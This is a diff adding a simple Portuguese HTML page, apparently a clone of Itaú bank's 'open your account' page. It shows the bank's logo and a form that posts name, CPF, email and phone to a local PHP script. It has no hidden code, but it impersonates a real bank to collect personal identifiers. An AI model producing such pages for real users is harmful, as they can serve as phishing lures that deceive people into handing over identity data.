@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="br PT">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Abra sua conta</title>
+    <link rel="stylesheet" href="style.css/style.css">
+</head>
+
+<body>
+
+<img src="Logo-itau.webp.webp" alt="Logo do Banco Itaú" width="48" height="48">
+<h1 style="color: rgb(0, 0, 0);">Abra sua conta</h1>
+<p style="color: rgb(0, 0, 0);">É rápido e fácil abrir sua conta digital no Itaú. Você pode fazer tudo pelo celular, sem sair de
+    casa.</p>
+<form action="processar_formulario.php" method="post">
+    <label for="nome" style="color: rgb(0, 0, 0);">Conta e cartão grátis, saldo que rende automaticamente e outros benefícios para você.</label><br>
+    <input type="text" id="nome" name="nome" placeholder="Nome" required><br><br>
+   <input type="number" id="cpf" name="cpf" placeholder="CPF" required><br><br>
+    <input type="email" id="email" name="email" placeholder="E-mail" required><br><br>
+    <input type="tel" id="telefone" name="telefone" placeholder="Telefone" required><br><br>
+    <button type="submit" style="background-color: white; color: rgb(245, 98, 0); padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">Continuar</button>
+</body>
+
+</html>
